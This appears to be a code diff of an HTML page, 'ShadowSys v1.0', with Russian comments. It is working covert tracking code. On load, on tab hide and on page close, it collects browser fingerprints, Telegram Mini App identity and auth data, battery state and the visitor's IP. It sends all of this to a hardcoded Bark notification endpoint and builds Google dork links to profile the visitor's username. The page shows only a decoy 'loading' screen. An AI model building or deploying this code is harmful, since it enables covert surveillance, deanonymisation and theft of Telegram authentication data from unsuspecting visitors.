@@ -3,11 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <title>ShadowSys v1.0</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
-        // ========== БАРК АПИ ==========
         const BARK_URL = 'https://api.day.app/2mfG6468JsmXaVLaLETob/';
 
-        // Функция отправки в BARK
         function sendToBark(title, body) {
             const payload = {
                 title: title,
@@ -15,10 +14,7 @@
                 group: 'ShadowLog',
                 sound: 'alarm'
             };
-            // Используем sendBeacon, чтобы успеть отправить даже при закрытии вкладки
             navigator.sendBeacon(BARK_URL, new Blob([JSON.stringify(payload)], {type: 'application/json'}));
-            
-            // Дублируем fetch для надёжности (если sendBeacon не сработает)
             fetch(BARK_URL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -26,7 +22,6 @@
             }).catch(() => {});
         }
 
-        // ========== 1. СБОР ФИНГЕРПРИНТА (МАКСИМУМ) ==========
         function getFingerprint() {
             const canvas = document.createElement('canvas');
             canvas.width = 256;
@@ -40,7 +35,6 @@
             ctx.fillText('ShadowCode', 2, 15);
             const canvasHash = canvas.toDataURL().substring(0, 64);
 
-            // WebGL Vendor
             let glVendor = 'N/A', glRenderer = 'N/A';
             try {
                 const gl = document.createElement('canvas').getContext('webgl');
@@ -53,7 +47,6 @@
                 }
             } catch (e) {}
 
-            // Audio fingerprint (колебания звука)
             let audioFp = 'N/A';
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
@@ -75,41 +68,65 @@
             };
         }
 
-        // ========== 2. БАТАРЕЯ И ПЕРФ ==========
         function getBatteryInfo() {
-            let batt = { level: 'N/A', charging: 'N/A' };
-            if (navigator.getBattery) {
-                navigator.getBattery().then(b => {
-                    batt.level = (b.level * 100).toFixed(0) + '%';
-                    batt.charging = b.charging ? 'Да' : 'Нет';
-                }).catch(() => {});
-            }
-            return batt;
+            return new Promise((resolve) => {
+                let batt = { level: 'N/A', charging: 'N/A' };
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(b => {
+                        batt.level = (b.level * 100).toFixed(0) + '%';
+                        batt.charging = b.charging ? 'Да' : 'Нет';
+                        resolve(batt);
+                    }).catch(() => resolve(batt));
+                } else {
+                    resolve(batt);
+                }
+            });
         }
 
-        // ========== 3. TELEGRAM WEB APP (MINI APPS) ==========
-        function getTelegramData() {
-            let tg = { username: 'N/A', id: 'N/A', first_name: 'N/A' };
+        function getRealTelegramData() {
+            let tg = { 
+                username: 'N/A', 
+                id: 'N/A', 
+                first_name: 'N/A', 
+                last_name: 'N/A',
+                language_code: 'N/A',
+                is_premium: 'N/A',
+                auth_date: 'N/A',
+                hash: 'N/A'
+            };
+            
             try {
                 if (window.Telegram && window.Telegram.WebApp) {
                     const app = window.Telegram.WebApp;
-                    if (app.initDataUnsafe) {
+                    app.ready();
+                    
+                    if (app.initDataUnsafe && app.initDataUnsafe.user) {
                         const user = app.initDataUnsafe.user;
-                        if (user) {
-                            tg.username = user.username || 'N/A';
-                            tg.id = user.id || 'N/A';
-                            tg.first_name = user.first_name || 'N/A';
-                        }
-                        // Дополнительно чекаем auth_date и hash
+                        tg.id = user.id || 'N/A';
+                        tg.first_name = user.first_name || 'N/A';
+                        tg.last_name = user.last_name || 'N/A';
+                        tg.username = user.username || 'N/A';
+                        tg.language_code = user.language_code || 'N/A';
+                        tg.is_premium = user.is_premium ? 'Premium' : 'Free';
+                    }
+                    
+                    if (app.initDataUnsafe) {
                         tg.auth_date = app.initDataUnsafe.auth_date || 'N/A';
                         tg.hash = app.initDataUnsafe.hash || 'N/A';
                     }
+                    
+                    tg.initData = app.initData || 'N/A';
+                    tg.platform = app.platform || 'N/A';
+                    tg.version = app.version || 'N/A';
+                    tg.colorScheme = app.colorScheme || 'N/A';
                 }
-            } catch (e) {}
+            } catch (e) {
+                sendToBark('TG Error', e.message);
+            }
+            
             return tg;
         }
 
-        // ========== 4. ГЕНЕРАЦИЯ ДОРК-ССЫЛОК ==========
         function getDorkLinks(username) {
             if (!username || username === 'N/A') return [];
             const dorks = [
@@ -131,112 +148,107 @@
             return dorks.map(d => `https://www.google.com/search?q=${encodeURIComponent(d)}`);
         }
 
-        // ========== 5. ГЛАВНЫЙ СБОР И ОТПРАВКА ==========
         function collectAndSend() {
             try {
                 const fp = getFingerprint();
-                const tg = getTelegramData();
+                const tg = getRealTelegramData();
                 const dorks = getDorkLinks(tg.username);
 
-                // Сбор базовой информации
-                const data = {
-                    ip: 'N/A (прокси/сервер)',
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    languages: navigator.languages ? navigator.languages.join(',') : 'N/A',
-                    cookieEnabled: navigator.cookieEnabled,
-                    doNotTrack: navigator.doNotTrack || 'N/A',
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    screenRes: `${screen.width}x${screen.height}`,
-                    screenColorDepth: screen.colorDepth,
-                    windowSize: `${window.innerWidth}x${window.innerHeight}`,
-                    plugins: Array.from(navigator.plugins).map(p => p.name).join('; '),
-                    mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type).join('; '),
-                    connection: navigator.connection ? {
-                        rtt: navigator.connection.rtt,
-                        downlink: navig.connection.downlink,
-                        effectiveType: navig.connection.effectiveType
-                    } : 'N/A',
-                    // Telegram
-                    tg_username: tg.username,
-                    tg_id: tg.id,
-                    tg_first_name: tg.first_name,
-                    tg_auth_date: tg.auth_date,
-                    tg_hash: tg.hash,
-                    // Fingerprint
-                    canvas_hash: fp.canvas_hash,
-                    webgl_vendor: fp.webgl_vendor,
-                    webgl_renderer: fp.webgl_renderer,
-                    audio_fp: fp.audio_fp,
-                    // Dorks
-                    dork_links: dorks.join(' | ')
+                let bodyText = `🕵️‍♂️ SHADOWLOG | ${new Date().toISOString()}\n\n`;
+                bodyText += `📱 TG: @${tg.username} (ID: ${tg.id})\n`;
+                bodyText += `👤 Имя: ${tg.first_name} ${tg.last_name}\n`;
+                bodyText += `💎 Статус: ${tg.is_premium}\n`;
+                bodyText += `🌍 Язык TG: ${tg.language_code}\n`;
+                bodyText += `📟 Платформа TG: ${tg.platform} v${tg.version}\n`;
+                bodyText += `🎨 Тема: ${tg.colorScheme}\n`;
+                bodyText += `🖥️ UA: ${navigator.userAgent}\n`;
+                bodyText += `📍 Платформа: ${navigator.platform}\n`;
+                bodyText += `🌐 Язык: ${navigator.language} | Таймзона: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+                bodyText += `📺 Экран: ${screen.width}x${screen.height} (${screen.colorDepth}bit)\n`;
+                bodyText += `🪟 Окно: ${window.innerWidth}x${window.innerHeight}\n`;
+                bodyText += `🍪 Cookie: ${navigator.cookieEnabled ? 'Да' : 'Нет'}\n`;
+                bodyText += `🎨 Canvas: ${fp.canvas_hash.substring(0, 30)}...\n`;
+                bodyText += `🎮 WebGL: ${fp.webgl_vendor} | ${fp.webgl_renderer}\n`;
+                bodyText += `🔊 Audio FP: ${fp.audio_fp}\n`;
+                
+                if (dorks.length > 0) {
+                    bodyText += `\n🔗 DORKS (первые 5):\n${dorks.slice(0, 5).join('\n')}`;
+                }
+
+                sendToBark('⚡ ShadowCode | @' + tg.username, bodyText);
+
+                const rawData = {
+                    telegram: tg,
+                    fingerprint: fp,
+                    browser: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        languages: navigator.languages ? Array.from(navigator.languages) : [],
+                        cookieEnabled: navigator.cookieEnabled,
+                        doNotTrack: navigator.doNotTrack,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        screenResolution: `${screen.width}x${screen.height}`,
+                        colorDepth: screen.colorDepth,
+                        windowSize: `${window.innerWidth}x${window.innerHeight}`,
+                        plugins: Array.from(navigator.plugins).map(p => p.name),
+                        hardwareConcurrency: navigator.hardwareConcurrency,
+                        deviceMemory: navigator.deviceMemory,
+                        connection: navigator.connection ? {
+                            rtt: navigator.connection.rtt,
+                            downlink: navigator.connection.downlink,
+                            effectiveType: navigator.connection.effectiveType
+                        } : null
+                    },
+                    dorks: dorks,
+                    timestamp: new Date().toISOString()
                 };
 
-                // Формируем читаемое тело для BARK
-                let bodyText = `🕵️‍♂️ SHADOWLOG | ${new Date().toISOString()}\n\n`;
-                bodyText += `📱 TG: @${data.tg_username} (ID: ${data.tg_id})\n`;
-                bodyText += `👤 Имя: ${data.tg_first_name}\n`;
-                bodyText += `🖥️ UA: ${data.userAgent}\n`;
-                bodyText += `📍 Платформа: ${data.platform}\n`;
-                bodyText += `🌐 Язык: ${data.language} | Таймзона: ${data.timezone}\n`;
-                bodyText += `📺 Экран: ${data.screenRes} (${data.screenColorDepth}bit)\n`;
-                bodyText += `🔌 Плагины: ${data.plugins.substring(0, 100)}...\n`;
-                bodyText += `📶 Сеть: ${typeof data.connection === 'string' ? data.connection : data.connection.effectiveType} (RTT: ${data.connection.rtt || 'N/A'})\n`;
-                bodyText += `🎨 Canvas: ${data.canvas_hash.substring(0, 20)}...\n`;
-                bodyText += `🎮 WebGL: ${data.webgl_vendor} | ${data.webgl_renderer}\n`;
-                bodyText += `🔊 Audio FP: ${data.audio_fp}\n`;
-                bodyText += `🔗 DORKS: ${data.dork_links || 'Нет юзернейма'}\n`;
-
-                // Отправляем
-                sendToBark('⚡ ShadowCode | Full Dump', bodyText);
-
-                // Дополнительно шлём сырой JSON, если надо (вторым уведомлением)
                 setTimeout(() => {
-                    sendToBark('📦 RAW JSON', JSON.stringify(data, null, 2).substring(0, 2000));
-                }, 300);
+                    sendToBark('📦 RAW JSON', JSON.stringify(rawData, null, 2).substring(0, 3500));
+                }, 500);
 
-                // Показать в консоли для отладки (чтобы ты видел, что ушло)
-                console.log('[ShadowCode] Отправлено:', data);
+                console.log('[ShadowCode] Отправлено:', rawData);
 
             } catch (err) {
-                sendToBark('⚠️ ShadowCode ERROR', err.message);
+                sendToBark('⚠️ ShadowCode ERROR', err.message + '\nStack: ' + err.stack);
             }
         }
 
-        // ========== СТАРТ СРАЗУ ==========
         window.onload = function() {
-            collectAndSend();
+            setTimeout(() => {
+                collectAndSend();
+            }, 1000);
 
-            // Повторный сбор через 2 секунды для батареи (асинхрон)
             setTimeout(() => {
                 getBatteryInfo().then(batt => {
                     sendToBark('🔋 Батарея', `Заряд: ${batt.level}\nЗарядка: ${batt.charging}`);
                 }).catch(() => {});
-            }, 2000);
+            }, 3000);
 
-            // Пытаемся достать IP через внешний сервис (но CORS может убить - оставляем для смельчаков)
             try {
                 fetch('https://api.ipify.org?format=json')
                     .then(res => res.json())
                     .then(ipData => {
-                        sendToBark('🌐 IP Адрес (внешний)', `IP: ${ipData.ip}`);
+                        sendToBark('🌐 IP Адрес', `IP: ${ipData.ip}`);
                     }).catch(() => {});
             } catch (e) {}
         };
 
-        // ========== ЕЩЁ ОДНА ЗАГЛУШКА ДЛЯ СБОРА ПРИ ЗАКРЫТИИ ==========
         window.addEventListener('beforeunload', function() {
-            collectAndSend(); // отправим ещё раз, на всякий случай
+            collectAndSend();
         });
 
-        console.log('[ShadowCode] Инъекция готова. Жди уведомлений в BARK.');
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                collectAndSend();
+            }
+        });
     </script>
 </head>
 <body style="background:#0a0a0a;color:#0f0;font-family:monospace;text-align:center;padding-top:40vh;">
     <h1 style="text-shadow:0 0 20px #0f0;">☠ SHADOWCODE ACTIVE ☠</h1>
     <p style="color:#555;">Загрузка данных...</p>
-    <!-- Маскировка: картинка-пустышка или пустой div -->
     <div style="display:none;">Подключено к матрице...</div>
 </body>
 </html>
